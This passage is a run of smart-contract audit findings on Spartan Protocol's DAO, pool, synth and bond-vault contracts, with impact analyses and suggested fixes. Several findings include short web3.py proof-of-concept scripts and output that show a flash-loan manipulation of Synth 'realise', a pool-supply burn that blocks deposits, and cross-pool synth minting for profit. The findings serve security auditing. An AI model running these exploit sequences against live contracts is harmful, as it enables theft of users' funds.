`newParamProposal()` should only allow `COOL_OFF` and `ERAS_TO_EARN` proposal types 2. Perhaps have a "catch-all-else" proposal that will only call `_completeProposal()` in `finaliseProposal()`  ```jsx function finaliseProposal() external {  ...  } else if (isEqual(_type, 'ADD_CURATED_POOL')){   _addCuratedPool(currentProposal);   } else if (isEqual(_type, 'REMOVE_CURATED_POOL')){     _removeCuratedPool(currentProposal);   } else {   completeProposal(_proposalID);  } } ```  3. Do null validation checks in `newAddressProposal()` and `newParamProposal()`  ```jsx function newAddressProposal(address proposedAddress, string memory typeStr) external returns(uint) {     require(proposedAddress != address(0), "!address");   // TODO: validate typeStr   ... }  function newParamProposal(uint32 param, string memory typeStr) external returns(uint) {     require(param != 0, "!param");   // TODO: validate typeStr   ... } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  A host of problems arise from the L110-113 of the `claimForMember()` function, where `_claimable` is deducted from the bondedLP balance before the condition check, when it should be performed after (or the condition is changed to checking if the remaining bondedLP balance to zero).  ```jsx // L110 - L113 mapBondAsset_memberDetails[asset].bondedLP[member] -= _claimable; // Remove the claim amount from the user's remainder if(_claimable == mapBondAsset_memberDetails[asset].bondedLP[member]){  mapBondAsset_memberDetails[asset].claimRate[member] = 0; // If final claim; zero-out their claimRate } ```  **1. Permanently Locked Funds**  If a user claims his bonded LP asset by calling `dao.claimForMember()`, or a malicious attacker helps a user to claim by calling `dao.claimAllForMember()`, either which is done such that `_claimable` is exactly half of his remaining bondedLP funds of an asset, then the other half would be permanently locked.  - Assume `mapBondAsset_memberDetails[asset].bondedLP[member] = 2 * _claimable` - L110: `mapBondAsset_memberDetails[asset].bondedLP[member] = _claimable` - L111: The if condition is satisfied - L112: User's claimRate is erroneously set to 0 ⇒ `calcBondedLP()` will return 0, ie. funds are locked permanently  **2. Claim Rate Never Zeroes For Final Claim**   On the flip side, should a user perform a claim that enables him to perform a full withdrawal (ie. `_claimable` = `mapBondAsset_memberDetails[asset].bondedLP[member]`, we see the following effects:  - L110: `mapBondAsset_memberDetails[asset].bondedLP[member] = 0` - L111: The if condition is not satisfied, L112 does not execute, so the member's claimRate for the asset remains non-zero (it is expected to have been set to zero).  Thankfully, subsequent behaviour remains as expected since `calcBondedLP` returns zero as `claimAmount` is set to the member's bondedLP balance (which is zero after a full withdrawal).  ### Recommended Mitigation Steps  The `_claimable` deduction should occur after the condition check. Alternatively, change the condition check to `if (mapBondAsset_memberDetails[asset].bondedLP[member] == 0)`.  
# Handle  jonah1005   # Vulnerability details  ## Impact Synth `realise` function calculates `baseValueLP` and `baseValueSynth` base on AMM spot price which is vulnerable to flash loan attack. Synth's lp is subject to `realise` whenever the AMM ratio is different than Synth's debt ratio.   The attack is not necessarily required flash loan. Big whale of the lp token holders could keep calling realse by shifting token ratio of AMM pool back and forth.   ## Proof of Concept The vulnerability locates at: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L187-L199  Where the formula here is dangerous: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L114-L126  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L210-L217 Here's a script for conducting flashloan attack ```python flashloan_amount = init_amount user = w3.eth.accounts[0] marked_token.functions.transfer(user, flashloan_amount).transact() marked_token.functions.transfer(token_pool.address, flashloan_amount).transact({'from': user}) token_pool.functions.addForMember(user).transact({'from': user}) received_lp = token_pool.functions.balanceOf(user).call()  synth_balance_before_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call() token_synth.functions.realise(token_pool.address).transact() token_pool.functions.transfer(token_pool.address, received_lp).transact({'from': user}) token_pool.functions.removeForMember(user).transact({'from': user}) token_synth.functions.realise(token_pool.address).transact() synth_balance_after_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call() print('synth_lp_balance_after_realise', synth_balance_after_realise) print('synth_lp_balance_before_realise', synth_balance_before_realise)  ``` Output: ``` synth_balance_after_realise 1317859964829313908162 synth_balance_before_realise 2063953488372093023256 ``` ## Tools Used None  ## Recommended Mitigation Steps Calculating Lp token's value base on AMM protocol is known to be dangerous. There are a few steps that might solve the issue: 1. calculate token's price from a reliable source.  Implement a TWAP oracle or uses chainlink oracle. 2. calculate lp token value based on anti-flashloan formula.  Alpha finance's formula is a good reference: https://blog.alphafinance.io/fair-lp-token-pricing   
# Handle  jonah1005   # Vulnerability details  ## Impact  `Pool` allows users to burn lp tokens without withdrawing the tokens. This allows the hacker to mutate the pools' rate to a point that no one can get any lp token anymore (even if depositing token).  The liquidity tokens are calculated at `Utils:calcLiquidityUnits` ```             // units = ((P (t B + T b))/(2 T B)) * slipAdjustment             // P * (part1 + part2) / (part3) * slipAdjustment             uint slipAdjustment = getSlipAdustment(b, B, t, T);             uint part1 = t*(B);             uint part2 = T*(b);             uint part3 = T*(B)*(2);             uint _units = (P * (part1 + (part2))) / (part3);             return _units * slipAdjustment / one;  // Divide by 10**18 ``` where `P` stands for `totalSupply` of current Pool. If `P` is too small (e.g, 1) then all the units would be rounding to 0.  Since any person can create a `Pool` at `PoolFactory`, hackers can create a Pool and burn his lp and set `totalSupply` to 1. He will be the only person who owns the Pool's lp from now on.  ## Proof of Concept Pool's burn logic: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L146  Utils' lp token formula: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L80  Here's a script of a user depositing 1M token to a pool where `totalSupply` equals 1  ``` dai_pool.functions.burn(init_amount-1).transact() print('total supply', dai_pool.functions.totalSupply().call()) dai.functions.transfer(dai_pool.address, 1000000 * 10**18).transact() dai_pool.functions.addForMember(user).transact() print('lp received from depositing 1M dai: ', dai_pool.functions.balanceOf(user).call()) ```  Output: ``` total supply 1 lp received from depositing 1M dai:  0 ``` ## Tools Used None ## Recommended Mitigation Steps Remove `burn` or restrict it to privileged users only.   
# Handle  hickuphh3   # Vulnerability details  ### Impact  The `claimAllForMember()` function iterates through the full list of `listedAssets`. Should `listedAssets` become too large, as more assets are listed, calling this function will run out of gas and fail.  ### Recommended Mitigation Steps  A good compromise would be to take in an array of asset indexes, so that users can claim for multiple assets in multiple parts.  ```jsx function claimAllForMember(address member, uint256[] calldata assetIndexes)  external returns (bool){         address [] memory listedAssets = listedBondAssets; // Get array of bond assets         for(uint i = 0; i < assetIndexes.length; i++){             uint claimA = calcClaimBondedLP(member, listedAssets[assetIndexes[i]]); // Check user's unlocked Bonded LPs for each asset             if(claimA > 0){                _BONDVAULT.claimForMember(listedAssets[assetIndexes[i]], member); // Claim LPs if any unlocked             }         }         return true;     } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  In the case where `arrayFeeLength < arrayFeeSize`, totalTradeFees is not calculated, so normalAverageFee will be 0. Hence, a return statement can be added to exit the function. Otherwise, when `arrayFeeSize >= arrayFeeLength`, the feeArray elements are iterated through twice:  - First, in `addFee`, to shift the elements by 1 to make way for the new fee. Note that `addFee()` is also solely called by `addTradeFee()` - Second, for the calculation of totalTradeFees  With all these in mind, we can make the second iteration redundant by combining the total trade fee calculation in `addFee()`.  ### Recommended Mitigation Steps  ```jsx function addTradeFee(uint _fee) internal {  uint arrayFeeLength = feeArray.length;   if(arrayFeeLength < arrayFeeSize){   feeArray.push(_fee); // Build array until it is == arrayFeeSize     return;    }   // If array is required length; shift in place of oldest item   // Calculate totalTradeFee at the same time   uint totalTradeFees = addCurrentFeeAndCalcTotalTradeFees(arrayFeeLength, _fee);    normalAverageFee = totalTradeFees / arrayFeeSize; // Calc average fee }  function addCurrentFeeAndCalcTotalTradeFees(   uint arrayFeeLength,  uint _fee ) internal returns (uint totalTradeFees) {  totalTradeFees = _fee; // add newest fee   // store and update in memory first, for gas optimization   uint[] memory _feeArray = feeArray;   for (uint i = arrayFeeLength - 1; i > 0; i--) {   _feeArray[i] = _feeArray[i - 1];     totalTradeFees += _feeArray[i];   }   _feeArray[0] = _fee;   feeArray = _feeArray; } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The current `changeArrayFeeSize` implementation deletes the entire feeArray (which is used to calculate normalAverageFee for dividends), resulting in having to rebuild the feeArray again.  It would be better to keep the feeArray as is if the `_size` is greater than the current feeArrayLength, or trim it otherwise, so that the calculation `normalAverageFee` has past trade fees to use and is therefore more accurate.  ### Recommended Mitigation Steps  ```jsx function changeArrayFeeSize(uint _size) external onlyDAO {  arrayFeeSize = _size;   // trim feeArray to match _size   if (_size < feeArray.length) {      uint[] memory tempFeeArray = new uint[](_size);      // copy feeArray for gas optimization      uint[] memory _feeArray = feeArray;    for (uint i = 0; i < _size; i++) {         tempFeeArray[i] = _feeArray[i];    }      feeArray = tempFeeArray;  }   // otherwise, keep feeArray unchanged } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  For minting, burning of synths and swaps, the fee and output amounts are calculated separately via `calcSwapOutput` and `calcSwapFee`. To avoid rounding errors and duplicate calculations, it would be best to combine both of these functions and return both outputs at once.  For example, if we take `x = 60000, X = 73500, Y = 50321`, the actual swap fee should be `10164.57` and output `12451.6`. However, `calcSwapOutput` and `calcSwapFee` returns `10164` and `12451`, leaving 1 wei unaccounted for. This can be avoided by combining the calculations as suggested below. The fee and actual output will be `10164` and `12452` instead.  Functions that have to call `calcSwapOutput` within the contract (eg. `calcSwapValueInBaseWithPool`) should call this function as well, for calculation consistency.  In addition, calculations for both `calcSwapOutput` and `calcSwapFee` will phantom overflow if the input values become too large. (Eg. `x = 2^128, Y=2^128`). This can be avoided by the suggested implementation below using the FullMath library.  ### Recommended Mitigation Steps  ```jsx function calcSwapFeeAndOutput(uint x, uint X, uint Y) public pure returns (uint output, uint swapFee) {      uint xAddX = x + X;      uint rawOutput = FullMath.mulDiv(x, Y, xAddX);      swapFee = FullMath.mulDiv(rawOutput, x, xAddX);      output = rawOutput - swapFee; }  function calcSwapValueInBaseWithPool(address pool, uint amount) public view returns (uint _output){        uint _baseAmount = iPOOL(pool).baseAmount();        uint _tokenAmount = iPOOL(pool).tokenAmount();        (_output, ) = calcSwapFeeAndOutput(amount, _tokenAmount, _baseAmount); } ```  The FullMath library is included (and made compatible with sol 0.8+) below for convenience.  ```jsx // SPDX-License-Identifier: MIT pragma solidity >= 0.8.0;  /// @title Contains 512-bit math functions /// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision /// @dev Handles "phantom overflow" i.e., allows multiplication and division where an intermediate value overflows 256 bits library FullMath {     /// @notice Calculates floor(a×b÷denominator) with full precision. Throws if result overflows a uint256 or denominator == 0     /// @param a The multiplicand     /// @param b The multiplier     /// @param denominator The divisor     /// @return result The 256-bit result     /// @dev Credit to Remco Bloemen under MIT license https://xn--2-umb.com/21/muldiv     function mulDiv(         uint256 a,         uint256 b,         uint256 denominator     ) internal pure returns (uint256 result) {         // 512-bit multiply [prod1 prod0] = a * b         // Compute the product mod 2**256 and mod 2**256 - 1         // then use the Chinese Remainder Theorem to reconstruct         // the 512 bit result. The result is stored in two 256         // variables such that product = prod1 * 2**256 + prod0         uint256 prod0; // Least significant 256 bits of the product         uint256 prod1; // Most significant 256 bits of the product         assembly {             let mm := mulmod(a, b, not(0))             prod0 := mul(a, b)             prod1 := sub(sub(mm, prod0), lt(mm, prod0))         }          // Handle non-overflow cases, 256 by 256 division         if (prod1 == 0) {             require(denominator > 0, "0 denom");             assembly {                 result := div(prod0, denominator)             }             return result;         }          // Make sure the result is less than 2**256.         // Also prevents denominator == 0         require(denominator > prod1, "denom <= prod1");          ///////////////////////////////////////////////         // 512 by 256 division.         ///////////////////////////////////////////////          // Make division exact by subtracting the remainder from [prod1 prod0]         // Compute remainder using mulmod         uint256 remainder;         assembly {             remainder := mulmod(a, b, denominator)         }         // Subtract 256 bit number from 512 bit number         assembly {             prod1 := sub(prod1, gt(remainder, prod0))             prod0 := sub(prod0, remainder)         }          // Factor powers of two out of denominator         // Compute largest power of two divisor of denominator.         // Always >= 1.         uint256 twos = denominator & (~denominator + 1);         // Divide denominator by power of two         assembly {             denominator := div(denominator, twos)         }          // Divide [prod1 prod0] by the factors of two         assembly {             prod0 := div(prod0, twos)         }         // Shift in bits from prod1 into prod0. For this we need         // to flip `twos` such that it is 2**256 / twos.         // If twos is zero, then it becomes one         assembly {             twos := add(div(sub(0, twos), twos), 1)         }         unchecked {             prod0 |= prod1 * twos;                          // Invert denominator mod 2**256             // Now that denominator is an odd number, it has an inverse             // modulo 2**256 such that denominator * inv = 1 mod 2**256.             // Compute the inverse by starting with a seed that is correct             // correct for four bits. That is, denominator * inv = 1 mod 2**4             uint256 inv = (3 * denominator) ^ 2;                          // Now use Newton-Raphson iteration to improve the precision.             // Thanks to Hensel's lifting lemma, this also works in modular             // arithmetic, doubling the correct bits in each step.             inv *= 2 - denominator * inv; // inverse mod 2**8             inv *= 2 - denominator * inv; // inverse mod 2**16             inv *= 2 - denominator * inv; // inverse mod 2**32             inv *= 2 - denominator * inv; // inverse mod 2**64             inv *= 2 - denominator * inv; // inverse mod 2**128             inv *= 2 - denominator * inv; // inverse mod 2**256                          // Because the division is now exact we can divide by multiplying             // with the modular inverse of denominator. This will give us the             // correct result modulo 2**256. Since the precoditions guarantee             // that the outcome is less than 2**256, this is the final result.             // We don't need to compute the high bits of the result and prod1             // is no longer required.             result = prod0 * inv;         }         return result;     } } ```  
# Handle  jonah1005   # Vulnerability details  ## Impact `approveAndCall` approve max allowance to the receiver regardless of the given parameter.  This is far away from what the function name implies. Users would lose all the tokens by using this function.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L118 https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L113 ## Tools Used None ## Recommended Mitigation Steps Change to `_approve(msg.sender, recipient, amount); `  
# Handle  jonah1005   # Vulnerability details  ## Impact https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L46  The comment at `poolFactory` L46  is a bit misleading. ``` require(getPool(token) == address(0)); // Must be a valid token ```  A similar checks in `synthFactory` seems to be more clear. https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthFactory.sol#L38  ```         require(getSynth(token) == address(0), "exists"); // Synth must not already exist ```  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L46 ## Tools Used None ## Recommended Mitigation Steps  It seems that `PoolFactory` is the only contract that does not provide detailed revert messages. I wonder whether the devs do this because of the concern about the code size limit. If that's the case, I recommend refactoring it to libraries or even uses a proxy factory to create new pools.   Ref to proxy factory:  https://eips.ethereum.org/EIPS/eip-1167  
# Handle  hickuphh3   # Vulnerability details  ### Impact  In the `_approve` function, if the allowance passed in is `type(uint256).max`, nothing happens (ie. allowance will still remain at previous value). Contract integrations (DEXes for example) tend to hardcode this value to set maximum allowance initially, but this will result in zero allowance given instead.  This also makes the comment `// No need to re-approve if already max` misleading, because the max allowance attainable is `type(uint256).max - 1`, and re-approval does happen in this case.  This affects the `approveAndCall` implementation since it uses `type(uint256).max` as the allowance amount, but the resulting allowance set is zero.  ### Recommended Mitigation Steps  Keep it simple, remove the condition.  ```jsx function _approve(address owner, address spender, uint256 amount) internal virtual {         require(owner != address(0), "!owner");         require(spender != address(0), "!spender");         _allowances[owner][spender] = amount;         emit Approval(owner, spender, amount);     } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  2 conditions enable the `DEPLOYER` to drain the funds in the DAOVault.  - `DAOVault` is missing `purgeDeployer()` function - `onlyDAO()` is callable by both the `DAO` and the `DEPLOYER`  The `DEPLOYER` can, at any time, call `depositLP()` to increase the LP funds of any account, then call `withdraw()` to withdraw the entire balance.  The only good use case for the `DEPLOYER` here is to help perform emergency withdrawals for users. However, this could use a separate modifier, like `onlyDeployer()`.  ### Proof of Concept  1. `DEPLOYER` calls `depositLP()` with any arbitrary amount (maybe DAOVault's pool LP balance - Alice's deposited LP balance) for Alice and pool to increase their weight and balance. 2. At this point, Alice may vote for a proposal to swing it in her favour, or remove it otherwise (to implicitly vote against it) 3. `DEPLOYER` calls `withdraw()` for the Alice, which removes 100% of her balance (and therefore, the entire DAOVault's pool balance)  ### Recommended Mitigation Steps  - Create a separate role and modifier for the `DEPLOYER`, so that he is only able to call `withdraw()` but not `depositLP()` - Include the missing `purgeDeployer()` function.  
# Handle  gpersoon   # Vulnerability details  ## Impact The function depositForMember of BondVault.sol adds user to the array arrayMembers. However it does this for each asset that a user deposits. Suppose a user deposit multiple assets, than the user is added multiple times to the array arrayMembers.  This will mean the memberCount() doesn't show accurate results. Also allMembers() will contain duplicate members  ## Proof of Concept // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L60 function depositForMember(address asset, address member, uint LPS) external onlyDAO returns(bool){         if(!mapBondAsset_memberDetails[asset].isMember[member]){             mapBondAsset_memberDetails[asset].isMember[member] = true; // Register user as member (scope: user -> asset)             arrayMembers.push(member); // Add user to member array (scope: vault)             mapBondAsset_memberDetails[asset].members.push(member); // Add user to member array (scope: user -> asset)         }        ...      // Get the total count of all existing & past BondVault members     function memberCount() external view returns (uint256 count){         return arrayMembers.length;     }     function allMembers() external view returns (address[] memory _allMembers){         return arrayMembers;     }  ## Tools Used  ## Recommended Mitigation Steps Use a construction like this: mapping(address => bool) isMember;    if(!isMember[member]){             isMember[member] = true;             arrayMembers.push(member);     }               
# Handle  jonah1005   # Vulnerability details  ## Impact `Pool` can mint arbitrary `Sythn` provided as long as it's a valid synth. When there are multiple curated pools and synth (which the protocol is designed for), hackers can mint expensive synthetics from a cheaper AMM pool. The hacker can burn the minted synth at the expensive pool and get profit. The arbitrage profit can be amplified with flash loan services and break all the pegs.  ## Proof of Concept Pool's mintSynth logic: https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229-L242  Synth's mintSynth logic: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L165-L171  Synth's authorization logic: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242   The price of the synthetics to be mint is calculated in `Pool` based on the AMM price of the current Pool   Here's a web3.py script of minting arbitrary Synth in a pool. For simplicity, two pools are set with the assumption that link is 10x expensive than dai.  ```python sparta_amount = 100 * 10**18 initail_link_synth = link_synth.functions.balanceOf(user).call() base.functions.transfer(link_pool.address, sparta_amount).transact({'from': user}) link_pool.functions.mintSynth(link_synth.address, user).transact({'from': user}) after_link_synth = link_synth.functions.balanceOf(user).call()  print('get link synth amount from link pool:', after_link_synth - initail_link_synth)  sparta_amount = 100 * 10**18 initail_link_synth = link_synth.functions.balanceOf(user).call() base.functions.transfer(dai_pool.address, sparta_amount).transact({'from': user}) dai_pool.functions.mintSynth(link_synth.address, user).transact({'from': user}) after_link_synth = link_synth.functions.balanceOf(user).call()  print('get link synth amount from dai pool:', after_link_synth - initail_link_synth)  ```  The log of the above script ``` get link synth amount from link pool: 97078046905036524413 get link synth amount from dai pool: 970780469050365244136 ``` ## Tools Used  Hardhat  ## Recommended Mitigation Steps Checks the provided synth's underlying token in `mintSynth`  `require(iSYNTH(synthOut).LayerONE() == TOKEN, "invalid synth");`    
# Handle  gpersoon   # Vulnerability details  ## Impact When the DAO is upgraded via moveDao, it also updates the DAO address in BASE. However it doesn't update the DAO address in the Reserve.sol contract. This could be done with the function setIncentiveAddresses(..)  Now the next time grantFunds of DAO.sol is called, its tries to call:  _RESERVE.grantFunds(...)  The grantFunds of Reserve.sol has the modifier onlyGrantor(), which checks the msg.sender == DAO. However in the mean time the DAO has been updated and Reserve.sol doesn't know about it and thus the modifier will not allow access to the function. Thus grantFunds will revert.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L452  function moveDao(uint _proposalID) internal {         address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address         require(_proposedAddress != address(0), "!address"); // Proposed address must be valid         DAO = _proposedAddress; // Change the DAO to point to the new DAO address         iBASE(BASE).changeDAO(_proposedAddress); // Change the BASE contract to point to the new DAO address         daoHasMoved = true; // Set status of this old DAO         completeProposal(_proposalID); // Finalise the proposal     }      function grantFunds(uint _proposalID) internal {         uint256 _proposedAmount = mapPID_param[_proposalID]; // Get the proposed SPARTA grant amount         address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed SPARTA grant recipient         require(_proposedAmount != 0, "!param"); // Proposed grant amount must be valid         require(_proposedAddress != address(0), "!address"); // Proposed recipient must be valid         _RESERVE.grantFunds(_proposedAmount, _proposedAddress); // Grant the funds to the recipient         completeProposal(_proposalID); // Finalise the proposal     }  // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/outside-scope/Reserve.sol#L17   modifier onlyGrantor() {         require(msg.sender == DAO || msg.sender == ROUTER || msg.sender == DEPLOYER || msg.sender == LEND || msg.sender == SYNTHVAULT, "!DAO");         _;      }    function grantFunds(uint amount, address to) external onlyGrantor {       ....     }     function setIncentiveAddresses(address _router, address _lend, address _synthVault, address _Dao) external onlyGrantor {         ROUTER = _router;         LEND = _lend;         SYNTHVAULT = _synthVault;         DAO = _Dao;     }   ## Tools Used  ## Recommended Mitigation Steps Call setIncentiveAddresses(..) when a DAO upgrade is done.   
# Handle  gpersoon   # Vulnerability details  ## Impact A call to transferFrom or transfer is frequently done without checking the results. For certain ERC20 tokens, if insufficient tokens are present, no revert occurs but a result of "false" is returned. So its important to check this. If you don't you could mint tokens without have received sufficient tokens to do so. So you could loose funds.  Its also a best practice to check this. See below for example where the result isn't checked.  Note, in some occasions the result is checked (see below for examples).  ## Proof of Concept Highest risk: .\Dao.sol:                iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer user's assets to Dao contract .\Pool.sol:               iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user .\Pool.sol:               iBEP20(token).transfer(member, outputAmount); // Transfer the swap output to the selected user .\poolFactory.sol:   iBEP20(_token).transferFrom(msg.sender, _pool, _amount); .\Router.sol:           iBEP20(_fromToken).transfer(fromPool, iBEP20(_fromToken).balanceOf(address(this))); // Transfer TOKENs from ROUTER to fromPool .\Router.sol:           iBEP20(_token).transfer(_pool, iBEP20(_token).balanceOf(address(this))); // Transfer TOKEN to pool .\Router.sol:           iBEP20(_token).transferFrom(msg.sender, _pool, _amount); // Transfer TOKEN to pool .\Router.sol:           iBEP20(_token).transfer(_recipient, _amount); // Transfer TOKEN to recipient .\Synth.sol:             iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer tokens in  less risky .\Router.sol:           iBEP20(fromPool).transferFrom(_member, fromPool, unitsInput); // Transfer LPs from user to the pool .\BondVault.sol:     iBEP20(_pool).transfer(member, _claimable); // Send claim amount to user .\Router.sol:           iBEP20(_pool).transferFrom(_member, _pool, units); // Transfer LPs to the pool .\Router.sol:           iBEP20(_pool).transferFrom(_member, _pool, units); // Transfer LPs to pool .\Router.sol:           iBEP20(fromSynth).transferFrom(msg.sender, _poolIN, inputAmount); // Transfer synth from user to pool .\Pool.sol:               iBEP20(synthIN).transfer(synthIN, _actualInputSynth); // Transfer SYNTH to relevant synth contract .\Router.sol:           iBEP20(WBNB).transfer(_pool, _amount); // Transfer WBNB from ROUTER to pool .\Dao.sol:               iBEP20(BASE).transfer(newDAO, baseBal); .\Pool.sol:               iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user .\Pool.sol:               iBEP20(BASE).transfer(member, outputBase); // Transfer SPARTA to user .\Router.sol:           iBEP20(BASE).transfer(toPool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA from ROUTER to toPool .\Router.sol:           iBEP20(BASE).transfer(_pool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA to pool .\Router.sol:           iBEP20(BASE).transfer(_pool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA from ROUTER to pool .\Router.sol:           iBEP20(BASE).transferFrom(msg.sender, _pool, inputAmount); // Transfer SPARTA from ROUTER to pool  Sometimes the result is checked: .\Dao.sol:              require(iBEP20(pool).transferFrom(msg.sender, address(_DAOVAULT), amount), "!funds"); // Send user's deposit to the DAOVault .\Dao.sol:              require(iBEP20(BASE).transferFrom(msg.sender, address(_RESERVE), _amount), '!fee'); // User pays the new proposal fee .\DaoVault.sol:      require(iBEP20(pool).transfer(member, _balance), "!transfer"); // Transfer user's balance to their wallet .\synthVault.sol:    require(iBEP20(synth).transferFrom(msg.sender, address(this), amount)); // Must successfuly transfer in .\synthVault.sol:    require(iBEP20(synth).transfer(msg.sender, redeemedAmount)); // Transfer from SynthVault to user  ## Tools Used grep  ## Recommended Mitigation Steps Always check the result of transferFrom and transfer   
# Handle  gpersoon   # Vulnerability details  ## Impact The function curatedPoolCount() contains a for loop over the array arrayPools. If arrayPools would be too big then the loop would run out of gas and curatedPoolCount() would revert. This would mean that addCuratedPool() cannot be executed anymore (because it calls curatedPoolCount() )  The array arrayPools can be increased in size arbitrarily by repeatedly doing the following: - create a pool with createPoolADD()  (which requires 10,000 SPARTA) - empty the pool with remove() of Pool.sol, which gives back the SPARTA tokens These actions will use gas to perform.  ## Proof of Concept //https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L45  function createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){         require(getPool(token) == address(0)); // Must be a valid token         require((inputToken > 0 && inputBase >= (10000*10**18)), "!min"); // User must add at least 10,000 SPARTA liquidity & ratio must be finite         Pool newPool; address _token = token;         if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB         require(_token != BASE && iBEP20(_token).decimals() == 18); // Token must not be SPARTA & it's decimals must be 18         newPool = new Pool(BASE, _token); // Deploy new pool         pool = address(newPool); // Get address of new pool         mapToken_Pool[_token] = pool; // Record the new pool address in PoolFactory         _handleTransferIn(BASE, inputBase, pool); // Transfer SPARTA liquidity to new pool         _handleTransferIn(token, inputToken, pool); // Transfer TOKEN liquidity to new pool         arrayPools.push(pool); // Add pool address to the pool array        ..  function curatedPoolCount() internal view returns (uint){         uint cPoolCount;          for(uint i = 0; i< arrayPools.length; i++){             if(isCuratedPool[arrayPools[i]] == true){                 cPoolCount += 1;             }         }         return cPoolCount;     }   function addCuratedPool(address token) external onlyDAO {         ...         require(curatedPoolCount() < curatedPoolSize, "maxCurated"); // Must be room in the Curated list  //https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L187   function remove() external returns (uint outputBase, uint outputToken) {         return removeForMember(msg.sender);     }       // Contract removes liquidity for the user     function removeForMember(address member) public returns (uint outputBase, uint outputToken) {         uint256 _actualInputUnits = balanceOf(address(this)); // Get the received LP units amount         outputBase = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, BASE, address(this)); // Get the SPARTA value of LP units         outputToken = iUTILS(_DAO().UTILS()).calcLiquidityHoldings(_actualInputUnits, TOKEN, address(this)); // Get the TOKEN value of LP units         _decrementPoolBalances(outputBase, outputToken); // Update recorded BASE and TOKEN amounts         _burn(address(this), _actualInputUnits); // Burn the LP tokens         iBEP20(BASE).transfer(member, outputBase); // Transfer the SPARTA to user         iBEP20(TOKEN).transfer(member, outputToken); // Transfer the TOKENs to user         emit RemoveLiquidity(member, outputBase, outputToken, _actualInputUnits);         return (outputBase, outputToken);     } ## Tools Used  ## Recommended Mitigation Steps Create a variable curatedPoolCount and increase it in addCuratedPool and decrease it in removeCuratedPool   
# Handle  gpersoon   # Vulnerability details  ## Impact The function getPool doesn't check if the pool exits (e.g. it doesn't check if the resulting pool !=0) Other functions use the results of getPool and do followup actions.  For example createSynth checks isCuratedPool(_pool) == true; if somehow isCuratedPool(0) would set to be true, then further actions could be done. As far as I can see no actual problem occurs, but this is a dangerous construction and future code changes could introduce vulnerabilities. Additionally the reverts that will occur if the result of getPool==0 are perhaps difficult to troubleshoot.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L119     function getPool(address token) public view returns(address pool){         if(token == address(0)){             pool = mapToken_Pool[WBNB];   // Handle BNB         } else {             pool = mapToken_Pool[token];  // Handle normal token         }          return pool;     }  function createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){         require(getPool(token) == address(0)); // Must be a valid token       function createPool(address token) external onlyDAO returns(address pool){         require(getPool(token) == address(0)); // Must be a valid token       // https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/synthFactory.sol#L37  function createSynth(address token) external returns(address synth){         require(getSynth(token) == address(0), "exists"); // Synth must not already exist         address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get pool address         require(iPOOLFACTORY(_DAO().POOLFACTORY()).isCuratedPool(_pool) == true, "!curated"); // Pool must be Curated   ## Tools Used  ## Recommended Mitigation Steps In function getPool add something like: require  (pool !=0, "Pool doesn't exist");  Note: the functions createPoolADD and createPool also have to be changed, to use a different way to verify the pool doesn't exist.   
